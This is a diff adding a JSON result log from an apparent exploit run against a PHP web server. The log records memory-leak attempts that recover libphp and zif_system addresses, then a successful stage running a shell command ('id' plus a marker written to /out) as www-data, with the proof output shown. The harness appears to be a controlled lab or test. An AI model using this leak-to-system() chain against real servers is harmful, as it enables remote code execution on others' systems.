@@ -1,0 +1,171 @@
+{
+ "attempt": 5,
+ "started": "2026-10-22T13:25:59Z",
+ "stages": [
+  {
+   "stage": "A1",
+   "status": "HTTP/1.0 500 Internal Server Error",
+   "bytes": 211,
+   "sha256": "be3422ac8cb020909edbd96de499b40ec95a4296b7afa41ff61d96bf3dcb22dc",
+   "elapsed_s": 0.074
+  },
+  {
+   "stage": "B1",
+   "i": 0,
+   "bytes": 259,
+   "status": "HTTP/1.1 200 OK",
+   "elapsed_s": 0.077,
+   "leak": "miss",
+   "miss_reason": "RuntimeError('no heap pointers in leak window')"
+  },
+  {
+   "stage": "B1",
+   "i": 1,
+   "bytes": 259,
+   "status": "HTTP/1.1 200 OK",
+   "elapsed_s": 0.071,
+   "leak": "miss",
+   "miss_reason": "RuntimeError('no heap pointers in leak window')"
+  },
+  {
+   "stage": "B1",
+   "i": 2,
+   "bytes": 259,
+   "status": "HTTP/1.1 200 OK",
+   "elapsed_s": 0.06,
+   "leak": "miss",
+   "miss_reason": "RuntimeError('no heap pointers in leak window')"
+  },
+  {
+   "stage": "B1",
+   "i": 3,
+   "bytes": 259,
+   "status": "HTTP/1.1 200 OK",
+   "elapsed_s": 0.06,
+   "leak": "miss",
+   "miss_reason": "RuntimeError('no heap pointers in leak window')"
+  },
+  {
+   "stage": "B1",
+   "i": 4,
+   "bytes": 1675513,
+   "status": "HTTP/1.1 200 OK",
+   "elapsed_s": 0.036,
+   "leak": "hit",
+   "decoded": 819208,
+   "zdtor": "0x7f7828a30b60",
+   "libphp": "0x7f78283d2000",
+   "buckets": [
+    [
+     "0x7f7826000000",
+     7495
+    ],
+    [
+     "0x7f7828a00000",
+     1095
+    ],
+    [
+     "0x7f7826800000",
+     87
+    ],
+    [
+     "0x7f7825e00000",
+     79
+    ]
+   ],
+   "main": "0x7f7826800000",
+   "cand_counts": {
+    "0x7f7826800000": 87,
+    "0x7f7825e00000": 79
+   }
+  },
+  {
+   "stage": "A2",
+   "i": 0,
+   "status": "HTTP/1.0 500 Internal Server Error",
+   "bytes": 211,
+   "sha256": "16a3056ebd4e61e00ca31e02250ed6acc11cfff08de66dcf333aee2e3bed98ee",
+   "elapsed_s": 0.064
+  },
+  {
+   "stage": "A2",
+   "i": 1,
+   "status": "HTTP/1.0 500 Internal Server Error",
+   "bytes": 211,
+   "sha256": "16a3056ebd4e61e00ca31e02250ed6acc11cfff08de66dcf333aee2e3bed98ee",
+   "elapsed_s": 0.063
+  },
+  {
+   "stage": "A2",
+   "i": 2,
+   "status": "HTTP/1.0 500 Internal Server Error",
+   "bytes": 211,
+   "sha256": "16a3056ebd4e61e00ca31e02250ed6acc11cfff08de66dcf333aee2e3bed98ee",
+   "elapsed_s": 0.06
+  },
+  {
+   "stage": "A2",
+   "i": 3,
+   "status": "HTTP/1.0 500 Internal Server Error",
+   "bytes": 211,
+   "sha256": "16a3056ebd4e61e00ca31e02250ed6acc11cfff08de66dcf333aee2e3bed98ee",
+   "elapsed_s": 0.059
+  },
+  {
+   "stage": "A2",
+   "i": 4,
+   "status": "HTTP/1.0 500 Internal Server Error",
+   "bytes": 211,
+   "sha256": "16a3056ebd4e61e00ca31e02250ed6acc11cfff08de66dcf333aee2e3bed98ee",
+   "elapsed_s": 0.051
+  },
+  {
+   "stage": "B2",
+   "i": 0,
+   "status": "HTTP/1.1 200 OK",
+   "bytes": 259,
+   "sha256": "d3237035aa9e71d3d10dd247e4d3c7d0a56e4d4b3c0808aea4119a80646ba9d8",
+   "elapsed_s": 0.003
+  },
+  {
+   "stage": "B2",
+   "i": 1,
+   "status": "",
+   "bytes": 0,
+   "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+   "elapsed_s": 0.009,
+   "proof": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n9BIE_MW_20261022T130520Z_A5_b1\n"
+  }
+ ],
+ "success": true,
+ "marker": "9BIE_MW_20261022T130520Z_A5",
+ "bodies": {
+  "a1": {
+   "bytes": 1060211,
+   "sha256": "8e8fc166e6b326d20bb7611d8ef3cee3bd5da46447985312c1492ab0a44d1eb6"
+  },
+  "b1": {
+   "bytes": 33128677,
+   "sha256": "b6c547e0e9a2bb26607df1521de96f4d5c9adf4621c28b7ab491587b21ae40f2"
+  },
+  "a2": {
+   "bytes": 279369,
+   "sha256": "7af66c8f35c5fa6b47a539da6dca361d19543d9f62d61e4af891c2802bd5e236"
+  },
+  "b2_first": {
+   "bytes": 451384,
+   "sha256": "d9cf482e643599def52cfa1f977617dc56109428f4e9757c766f181832260f3b"
+  }
+ },
+ "S": "0x7f78268f8398",
+ "zif_system": "0x7f7828837370",
+ "b1_hit_attempt": 4,
+ "b2_cmd": "id>/out/p1_a5;echo 9BIE_MW_20261022T130520Z_A5_b0>>/out/p1_a5;id>&2;echo 9BIE_MW_20261022T130520Z_A5_b0>&2",
+ "b2_hit_attempt": 1,
+ "post_health": {
+  "status": "HTTP/1.1 200 OK",
+  "bytes": 195,
+  "body": "OK\n"
+ },
+ "finished": "2026-10-22T13:26:05Z"
+}
